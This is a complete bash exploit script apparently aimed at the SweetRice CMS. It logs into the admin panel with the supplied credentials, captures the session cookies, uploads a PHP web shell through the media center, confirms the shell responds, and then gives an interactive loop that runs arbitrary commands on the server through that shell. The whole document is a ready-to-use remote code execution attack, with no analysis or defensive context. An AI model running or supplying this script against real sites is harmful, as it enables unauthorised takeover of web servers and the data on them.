#!/bin/bash

baseurl=$1
user=$2
pass=$3

if [[ $1 == '' ]]
then
	echo "
./exploit.sh url username password

exmaple:

./exploit.sh http://127.0.0.1:8080 admin p4ssw0rd
"
exit
fi

req=$(curl -X POST $baseurl/as/?type=signin  -d "user=$user&passwd=$pass" -s --cookie-jar -)
cookie_passwd=$(echo $req | grep passwd |  grep -ow "[0-9a-f]\{32\}")
cookie_sweetrice=$(echo $req | grep sweetrice |  grep -ow "[0-9a-z]\{26\}")

if [[ $cookie_passwd == ''  ]]
then
	echo Login Failed.. exiting
	exit
fi

echo success
curl "$baseurl/as/?type=media_center&mode=upload"  --cookie "admin=$user;passwd=$cookie_passwd;dashboad_bg=#27652f;sweetrice=$cookie_sweetrice" -H "Content-Type: multipart/form-data" -F "upload[]=@shell.php5 -s" 2>/dev/null

check_shell=$(curl $baseurl/attachment/shell.php5 -s -o /dev/null -w "%{http_code}")
if [[ $check_shell == '200' ]]
then
	echo -e "Shell uploaded to : $baseurl/attachment/shell.php5"
else
	echo upload failed
fi

while true
do
	echo '[command]'
	read cmd
	if [[ $cmd == 'exit' ]]
	then
		exit
	fi
	a=$(curl "$baseurl/attachment/shell.php5?cmd=$cmd" -s)
 	echo $a

done
